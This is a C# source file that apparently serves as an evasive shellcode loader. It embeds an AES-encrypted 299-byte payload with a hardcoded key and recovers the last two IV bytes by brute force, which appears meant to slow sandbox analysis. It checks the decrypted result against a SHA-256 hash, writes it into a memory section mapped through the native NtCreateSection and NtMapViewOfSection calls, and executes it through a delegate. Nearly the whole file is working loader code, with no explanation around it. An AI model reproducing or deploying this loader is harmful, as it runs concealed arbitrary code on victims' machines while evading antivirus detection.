
using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.IO;
namespace ze
{
    class Program
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct SECT_DATA
        {
            public Boolean isvalid;
            public IntPtr hSection;
            public IntPtr pBase;
        }
        [DllImport("ntdll.dll")]
        public static extern UInt32 NtCreateSection(
            ref IntPtr section,
            UInt32 desiredAccess,
            IntPtr pAttrs,
            ref long MaxSize,
            uint pageProt,
            uint allocationAttribs,
            IntPtr hFile);
        [DllImport("ntdll.dll")]
        public static extern UInt32 NtMapViewOfSection(
            IntPtr SectionHandle,
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            IntPtr CommitSize,
            ref long SectionOffset,
            ref long ViewSize,
            uint InheritDisposition,
            uint AllocationType,
            uint Win32Protect);
        public static SECT_DATA MapLocalSectionAndWrite(byte[] ShellCode)
        {
            SECT_DATA SectData = new SECT_DATA();
            long ScSize = ShellCode.Length;
            long MaxSize = ScSize;
            IntPtr hSection = IntPtr.Zero;
            UInt32 CallResult = NtCreateSection(ref hSection, 0xe, IntPtr.Zero, ref MaxSize, 0x40, 0x8000000, IntPtr.Zero);
            if (CallResult == 0 && hSection != IntPtr.Zero)
            {
                SectData.hSection = hSection;
            }
            else
            {
                SectData.isvalid = false;
                return SectData;
            }
            IntPtr pScBase = IntPtr.Zero;
            long lSecOffset = 0;
            CallResult = NtMapViewOfSection(hSection, (IntPtr)(-1), ref pScBase, IntPtr.Zero, IntPtr.Zero, ref lSecOffset, ref MaxSize, 0x2, 0, 0x4);
            if (CallResult == 0 && pScBase != IntPtr.Zero)
            {
                SectData.pBase = pScBase;
            }
            else
            {
                SectData.isvalid = false;
                return SectData;
            }
            Marshal.Copy(ShellCode, 0, SectData.pBase, ShellCode.Length);
            IntPtr pScBase2 = IntPtr.Zero;
            CallResult = NtMapViewOfSection(hSection, (IntPtr)(-1), ref pScBase2, IntPtr.Zero, IntPtr.Zero, ref lSecOffset, ref MaxSize, 0x2, 0, 0x20);
            if (CallResult == 0 && pScBase != IntPtr.Zero)
            {
                SectData.pBase = pScBase2;
            }
            else
            {
                SectData.isvalid = false;
                return SectData;
            }
            SectData.isvalid = true;
            return SectData;
        }

        [UnmanagedFunctionPointerAttribute(CallingConvention.Cdecl)]
        private delegate Int32 Initialize();
        public static byte[] DecryptAES(byte[] buffer, byte[] key, byte[] iv, byte[] OGhash, int origLen)
        {
            if (buffer == null || buffer.Length <= 0)
                throw new ArgumentNullException("cipherText");
            if (key == null || key.Length <= 0)
                throw new ArgumentNullException("Key");
            if (iv == null || key.Length <= 0)
                throw new ArgumentNullException("IV");
            byte[] test = new byte[origLen];
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = iv;
                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                using (MemoryStream msDecrypt = new MemoryStream(buffer))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        csDecrypt.Read(test, 0, origLen);
                        HashAlgorithm sha = SHA256.Create();
                        byte[] result = sha.ComputeHash(test, 0, origLen);
                        bool bEqual = false;
                        if (result.Length == OGhash.Length)
                        {
                            int i = 0;
                            while ((i < result.Length) && (result[i] == OGhash[i]))
                            {
                                i += 1;
                            }
                            if (i == result.Length)
                            {
                                bEqual = true;
                            }
                        }
                        if (bEqual)
                            return test;
                        else
                            return null;
                    }
                }
            }
        }
        static void Runner(byte[] data)
        {
            byte[] key = { 0xa2,0xdc,0x60,0x82,0x66,0x5a,0xbd,0x3a,0xab,0x2a,0x60,0xc3,0x1d,0x87,0x3,0x66 };
            byte[] iv = { 0x43,0xe3,0x55,0x3c,0xfd,0x63,0xdc,0xfe,0xf2,0x8a,0xc9,0x35,0x85,0x95,0xf9,0x29 };
            
            byte[] OG_hash = {
               0x1a,0xbe,0x67,0xcb,0x87,0x87,0x2a,0xeb,0x99,0x24,0x15,0x3c,0xe6,0x8d,0xa8,0x6b,0x3c,0xba,0x27,0x6b,0x8d,0xc5,0xb9,0x2,0x90,0xe0,0x92,0xa7,0x36,0xf,0x5c,0x28
            };
            for (byte i = 0x01; i < 0xff; i++)
            {
                iv[14] = i;
                for (byte j = 1; j < 0xff; j++)
                {
                    iv[15] = j;
                    if (DecryptAES(data, key, iv, OG_hash, 299) != null) // OG len and encrypted len are different
                    {
                        byte[] shellcode = DecryptAES(data, key, iv, OG_hash, 299);
                        SECT_DATA LocalSect = MapLocalSectionAndWrite(shellcode);
                        if (!LocalSect.isvalid)
                        {
                            return;
                        }
                        Initialize del = (Initialize)Marshal.GetDelegateForFunctionPointer(LocalSect.pBase, typeof(Initialize));
                        del();

                        return;
                    }
                }
            }
        }
        public static void Main(string[] args)
        {
            byte[] buf = new byte[304] { 
                0x85,0x3a,0xc0,0x5a,0x10,0xc2,0x80,0x49,0x51,0x4c,0xde,0xda,0x87,0x20,0xab,0x26,0x2,0xd3,0xdd,0xae,0xd8,0x28,0x0,0x4,0x32,0x2e,0x96,0x60,0x99,0x42,0xdd,0x6d,0xb,0xf6,0x47,0x3f,0xb1,0x6d,0xf8,0x52,0xad,0xa2,0xa7,0x41,0x36,0x65,0xec,0x15,0x2d,
				0x33,0xbd,0xde,0x22,0xb3,0xa,0xc1,0xaa,0xb,0xa4,0x16,0xd2,0x13,0x23,0xc4,0x94,0xa1,0xd9,0x85,0x76,0x72,0xa9,0x5d,0xb,0x9c,0xdd,0x6f,0x54,0x67,0xe1,0x1a,0xfd,0x24,0xe,0x92,0x95,0x60,0x9,0x3,0x3f,0xbf,0x53,0x4d,0x3f,0xfe,0x22,0x2e,0x1,0xd6,
				0xd,0xc,0x80,0x90,0x5e,0x3c,0xc5,0x6f,0x8d,0x6f,0xf9,0xb2,0x75,0x99,0xba,0xef,0x8,0x28,0x7d,0x33,0x73,0x19,0x8f,0x37,0xdf,0x89,0xa,0xe4,0x17,0x1c,0x8d,0xbb,0x9a,0xf2,0xf4,0x32,0x9b,0xaa,0x14,0x97,0xdd,0xa6,0x31,0x6,0x18,0x8f,0x26,0x1,0xac,
				0xc,0x44,0x81,0x4b,0x1f,0x46,0x67,0x17,0xae,0xe5,0x5a,0xa9,0x61,0xdf,0x97,0x61,0xd3,0xad,0xd9,0x89,0x16,0x7c,0xb0,0x83,0xe2,0xb,0xbe,0x85,0xfc,0xf8,0xdd,0xc7,0x22,0x80,0x60,0x6d,0xa0,0x37,0x7d,0xb7,0x31,0x43,0x52,0x6d,0x65,0x45,0x57,0x3,0xcc,
				0xfd,0x69,0x2a,0xfc,0xff,0x1d,0xc3,0xf8,0x7,0xdb,0xd4,0xdd,0x79,0xf1,0x48,0xb8,0x85,0x73,0xc3,0x2f,0xb7,0x7e,0x83,0xef,0x73,0x40,0xe8,0x84,0xa0,0x88,0x52,0x8e,0xef,0xd9,0x25,0x84,0xd1,0xe8,0x59,0x36,0xc5,0x8,0x71,0xa9,0x31,0xd1,0x80,0x74,0x90,
				0xb9,0xfa,0xd0,0x78,0x15,0xee,0xe4,0x94,0x32,0xd3,0x93,0xf5,0xb7,0x27,0x28,0xba,0xb4,0x23,0xc4,0xfb,0x4b,0x61,0xfa,0xcb,0x18,0x81,0xc4,0xbd,0xf7,0xc3,0x7a,0xe0,0x54,0x66,0xf0,0x77,0x7d,0xf3,0x89,0xa5,0xe3,0x66,0xfe,0x9a,0x1,0x7b,0x54,0x4a,0x25,
				0xa,0xb0,0x9e,0x2d,0xe9,0x9d,0xb1,0xb5,0x91,0x9e, 
            };
            Runner(buf);
        }
    }
}
